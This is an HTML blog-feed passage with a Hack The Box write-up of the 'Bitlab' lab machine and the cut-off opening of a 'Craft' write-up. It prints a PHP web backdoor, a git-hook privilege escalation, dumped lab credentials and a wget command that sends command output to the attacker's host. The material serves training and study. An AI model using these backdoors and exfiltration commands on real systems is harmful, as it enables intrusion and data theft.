&lt;p&gt;When looking at the main page we can see an help link linking to a directory
listing page linking to a bookmarks page with a few bookmarks.&lt;/p&gt;
&lt;p&gt;&lt;img alt="help link" src="/media/2020.01/bitlab_1.png"&gt;
&lt;img alt="Directory listing" src="/media/2020.01/bitlab_2.png"&gt;
&lt;img alt="Last bookmark" src="/media/2020.01/bitlab_3.png"&gt;&lt;/p&gt;
&lt;p&gt;The last link as the following value.&lt;/p&gt;
&lt;p&gt;:::text
  javascript:(function(){%20var%20_0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document&lt;a href="_0x4b18[1]"&gt;_0x4b18[2]&lt;/a&gt;[_0x4b18[0]]=%20_0x4b18[3];document&lt;a href="_0x4b18[4]"&gt;_0x4b18[2]&lt;/a&gt;[_0x4b18[0]]=%20_0x4b18[5];%20})()&lt;/p&gt;
&lt;p&gt;We use an &lt;a href="https://lelinhtinh.github.io/de4js/"&gt;online JavaScript Deobfuscator and Unpacker&lt;/a&gt;
to get the link "true" value:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;javascript: (function () {&lt;/span&gt;
&lt;span class="code-line"&gt;    % 20&lt;/span&gt;
&lt;span class="code-line"&gt;    var % 20 _0x4b18 = [&amp;quot;value&amp;quot;, &amp;quot;user_login&amp;quot;, &amp;quot;getElementById&amp;quot;, &amp;quot;clave&amp;quot;, &amp;quot;user_password&amp;quot;, &amp;quot;11des0081x&amp;quot;];&lt;/span&gt;
&lt;span class="code-line"&gt;    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = % 20 _0x4b18[3];&lt;/span&gt;
&lt;span class="code-line"&gt;    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = % 20 _0x4b18[5]; % 20&lt;/span&gt;
&lt;span class="code-line"&gt;})()&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The credentials "clave" and "11des0081x" allow us to connect to the gitlab. We
have access to two projects owned by the "administrator" user: "Profile" and
"Deployer".&lt;/p&gt;
&lt;p&gt;&lt;img alt="Connected user" src="/media/2020.01/bitlab_4.png"&gt;&lt;/p&gt;
&lt;h2 id="gitlab-authenticated"&gt;Gitlab authenticated&lt;/h2&gt;
&lt;p&gt;The first project is the developer profile seen earlier. The second project is
the code use to deploy the first project using the following PHP syntax:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;if ($repo==&amp;#39;Profile&amp;#39; &amp;amp;&amp;amp; $branch==&amp;#39;master&amp;#39; &amp;amp;&amp;amp; $event==&amp;#39;merge_request&amp;#39; &amp;amp;&amp;amp; $state==&amp;#39;merged&amp;#39;) {&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;    echo shell_exec(&amp;#39;cd ../profile/; sudo git pull&amp;#39;),&amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can add a PHP simple reverse shell (the one in
&lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; on Kali), make a pull request and
merge it from the gitlab interface.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])){&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nv"&gt;$cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$cmd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="Adding some PHP file" src="/media/2020.01/bitlab_6.png"&gt;&lt;/p&gt;
&lt;p&gt;We then use the "Deployer" by accessing the &lt;code&gt;http://10.10.10.114/deployer/&lt;/code&gt; URL
and we can access our webshell with the &lt;code&gt;http://10.10.10.114/profile/cmd2.php&lt;/code&gt;
URL.&lt;/p&gt;
&lt;p&gt;We can also deploy a reverse shell (from
&lt;code&gt;/usr/share/webshell/php/reverse-shell.php&lt;/code&gt; for instance) and  get a shell as &lt;code&gt;www-data&lt;/code&gt;
We can use &lt;code&gt;python -c 'import pty; pty.spawn("/bin/sh")'&lt;/code&gt; in order to get a
interactive shell. We start enumerating the box and something interesting come
out: Our user as a &lt;code&gt;sudo&lt;/code&gt; permission with no password for &lt;code&gt;/usr/bin/git pull&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for www-data on bitlab:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, exempt_group=sudo, mail_badpass,&lt;/span&gt;
&lt;span class="code-line"&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User www-data may run the following commands on bitlab:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/git pull&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;My first idea was to try &lt;code&gt;sudo /usr/bin/git pull --help&lt;/code&gt; to get the pager as
root but that doesn't work. The second idea was to create a new git repository
and play with the post-merge hooks but I didn't had the right to create a new
git project. It seems like a dead end.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cd /var/www/html&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;deployer&lt;/span&gt;
&lt;span class="code-line"&gt;help&lt;/span&gt;
&lt;span class="code-line"&gt;index.html&lt;/span&gt;
&lt;span class="code-line"&gt;profile&lt;/span&gt;
&lt;span class="code-line"&gt;$ cp -r profile /tmp/poi&lt;/span&gt;
&lt;span class="code-line"&gt;$ cd /tmp/poi&lt;/span&gt;
&lt;span class="code-line"&gt;$ cd .git/hooks/&lt;/span&gt;
&lt;span class="code-line"&gt;$ echo &amp;#39;#!/bin/bash&amp;#39; &amp;gt;&amp;gt; post-merge&lt;/span&gt;
&lt;span class="code-line"&gt;$ echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt;&amp;gt; post-merge&lt;/span&gt;
&lt;span class="code-line"&gt;$ chmod +x post-merge&lt;/span&gt;
&lt;span class="code-line"&gt;$ sudo /usr/bin/git pull&lt;/span&gt;
&lt;span class="code-line"&gt;fatal: this operation must be run in a work tree&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="postgresql"&gt;Postgresql&lt;/h2&gt;
&lt;p&gt;By exploring more the gitlab we can found a "snippet" name "Postgresql" containing
the base of PHP script to connect to the database.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$db_connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pg_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;host=localhost dbname=profiles user=profiles password=profiles&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pg_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db_connection&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * FROM profiles&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We complete the script to display the database content.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$db_connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pg_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;host=localhost dbname=profiles user=profiles password=profiles&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pg_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db_connection&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * FROM profiles&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$numrows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;pg_numrows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nv"&gt;$numrows&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nv"&gt;$row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pg_fetch_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$row&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;user: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$row&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pass: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$row&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then deploy it and execute it. The content of the database is
&lt;code&gt;id: 1user: clavepass: c3NoLXN0cjBuZy1wQHNz==&lt;/code&gt;
Decoding the base64 password give an error as the padding is wrong.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ne&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c3NoLXN0cjBuZy1wQHNz&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;str0ng&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="nv"&gt;@ss&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The decoded password do not work. But using the base64 password is working
(&lt;strong&gt;WHY WOULD YOU DO THAT?!&lt;/strong&gt; this can be a complete brainfuck). We
can then connect to the box as clave using SSH and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh clave@10.10.10.114&lt;/span&gt;
&lt;span class="code-line"&gt;clave@10.10.10.114&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Tue Nov 26 07:17:40 2019 from 10.10.15.35&lt;/span&gt;
&lt;span class="code-line"&gt;clave@bitlab:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;RemoteConnection.exe  user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;clave@bitlab:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;1e3fd8&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="remoteconnectionexe"&gt;RemoteConnection.exe&lt;/h2&gt;
&lt;p&gt;If you just want to work on the binary, it is available
&lt;a href="/media/2020.01/RemoteConnection.exe"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A &lt;code&gt;RemoteConnection.exe&lt;/code&gt; binary is available in &lt;code&gt;clave&lt;/code&gt;'s home folder.
We copy it on our local system. It effectively a 32 bits Windows binary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;file RemoteConnection.exe&lt;/span&gt;
&lt;span class="code-line"&gt;RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can run &lt;code&gt;strings&lt;/code&gt; in order to find an hard coded password but this is not the
case here.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;strings RemoteConnection.exe &lt;/span&gt;
&lt;span class="code-line"&gt;!This program cannot be run in DOS mode.&lt;/span&gt;
&lt;span class="code-line"&gt;Rich&lt;/span&gt;
&lt;span class="code-line"&gt;.text&lt;/span&gt;
&lt;span class="code-line"&gt;`.rdata&lt;/span&gt;
&lt;span class="code-line"&gt;@.data&lt;/span&gt;
&lt;span class="code-line"&gt;.rsrc&lt;/span&gt;
&lt;span class="code-line"&gt;@.reloc&lt;/span&gt;
&lt;span class="code-line"&gt;M$SR&lt;/span&gt;
&lt;span class="code-line"&gt;u$9U8s&lt;/span&gt;
&lt;span class="code-line"&gt;hL2@&lt;/span&gt;
&lt;span class="code-line"&gt;hY(@&lt;/span&gt;
&lt;span class="code-line"&gt;hL2@&lt;/span&gt;
&lt;span class="code-line"&gt;Y_^[&lt;/span&gt;
&lt;span class="code-line"&gt;SVWP&lt;/span&gt;
&lt;span class="code-line"&gt;h,2@&lt;/span&gt;
&lt;span class="code-line"&gt;Y_^[&lt;/span&gt;
&lt;span class="code-line"&gt;h\2@&lt;/span&gt;
&lt;span class="code-line"&gt;hL2@&lt;/span&gt;
&lt;span class="code-line"&gt;=x@@&lt;/span&gt;
&lt;span class="code-line"&gt;=|@@&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We boot a Windows Box (That is the first time that I boot a Windows box for a
HTB challenge) and run the binary in it. We got a message &lt;code&gt;Access Denied !!&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;RemoteConnection.exe 10.10.10.114&lt;/span&gt;
&lt;span class="code-line"&gt;Access Denied !!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="x64dbg"&gt;x64dbg&lt;/h2&gt;
&lt;p&gt;We load the binary in &lt;a href="https://x64dbg.com/"&gt;x64dbg&lt;/a&gt;.
We run to user code (&lt;ALT&gt;+&lt;F9&gt;). Then we take a look at the strings. It seems
that our binary use putty to establish a remote SSH connection.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Strings in the binary" src="/media/2020.01/bitlab_8.png"&gt;&lt;/p&gt;
&lt;p&gt;We put a breakpoint (&lt;F2&gt; on the &lt;code&gt;Access Denied !!&lt;/code&gt; string).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Breaking on &amp;quot;Access Denied&amp;quot;" src="/media/2020.01/bitlab_9.png"&gt;&lt;/p&gt;
&lt;p&gt;And we execute the program (it will automatically stop at our breakpoint). We
can see that we got the options for putty:
&lt;code&gt;005EF708  02533678  "-ssh root@gitlab.htb -pw \"Qf7]8YSV.wDNF*[7d?j&amp;amp;eD4^\""&lt;/code&gt;.
We directly use the password to connect as root on the box and get the flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="The putty options at our breakpoint" src="/media/2020.01/bitlab_10.png"&gt;&lt;/p&gt;
&lt;p&gt;root@kalili:~# ssh root@10.10.10.114
root@10.10.10.114's password:
Last login: Tue Nov 26 10:41:25 2019 from 10.10.15.142
root@bitlab:~# cat /root/root.txt
8d4cc13&lt;redacted&gt;&lt;/p&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was interesting. The base64 password was a pain but still the user part
was quit realist as a lot of companies have some code versioning and CI tools
(gitlab, gogs, jenkins) the root part
was interesting at it implies some basic reverse engineering.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="gitlab"></category><category term="x64dbg"></category><category term="postgresql"></category><category term="linux"></category></entry><entry><title>HTB: Craft</title><link href="https://maggick.fr/2020/01/htb-craft.html" rel="alternate"></link><published>2020-01-05T10:35:00+01:00</published><updated>2020-01-05T10:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-01-05:/2020/01/htb-craft.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.01/craft_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/197"&gt;Craft&lt;/a&gt;
This box is classified as a medium machine. The user part is quit long and
involve to find "secrets" in a git repository, access an API to get a
reverse shell and manipulate a MySQL database in a jailed environment. The root
part is quit easier and involve to interact with a vault instance.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.01/craft_card.png" alt="Craft card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/197"&gt;Craft&lt;/a&gt;
This box is classified as a medium machine. The user part is quit long and
involve to find "secrets" in a git repository, access an API to get a
reverse shell and manipulate a MySQL database in a jailed environment. The root
part is quit easier and involve to interact with a vault instance.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.110&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.15s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp  open  ssl/http nginx 1.15.8&lt;/span&gt;
&lt;span class="code-line"&gt;6022/tcp open  ssh      (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port6022-TCP:V=7.80%I=7%D=11/8%Time=5DC57F7D%P=x86_64-pc-linux-gnu%r(NU&lt;/span&gt;
&lt;span class="code-line"&gt;SF:LL,C,&amp;quot;SSH-2\.0-Go\r\n&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website present the Craft database for &lt;strong&gt;beers&lt;/strong&gt;!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Craft aims to be the largest repository of US-produced craft brews accessible
over REST. In the future we will release a mobile app to interface with our
public rest API as well as a brew submission process, but for now, check out our API!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is also a link to a &lt;a href="https://gogs.io/"&gt;gogs&lt;/a&gt; as well as the API. This
links redirect to some subdomain. Let us add some informations in our
&lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/hosts&lt;/span&gt;
&lt;span class="code-line"&gt;127.0.0.1   localhost&lt;/span&gt;
&lt;span class="code-line"&gt;127.0.1.1   kalili&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.110    craft.htb&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.110    api.craft.htb&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.110    gogs.craft.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="gogs"&gt;GOGS&lt;/h2&gt;
&lt;p&gt;On the gogs commit we can found the credentials of an user used for testing purpose in
the commit &lt;code&gt;10e3ba4f0a09c778d7cec673f28d410b73455a86&lt;/code&gt; in the file
&lt;code&gt;test/test.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="git file" src="/media/2020.01/craft_1.png"&gt;&lt;/p&gt;
&lt;p&gt;This creds allow us to interct with the API. Moreover the &lt;code&gt;test.py&lt;/code&gt; script take
care to generate a valid token and let us directly interact with the API. The
quote are a bit a pain in the ass here. Nevertheless we can validate the code
execution using a python simpleHTTPserver on our end and execute &lt;code&gt;wget 10.10.14.51:8081/$(&amp;lt;command&amp;gt;)&lt;/code&gt;
server side.&lt;/p&gt;
&lt;p&gt;At least we get a reverse shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;
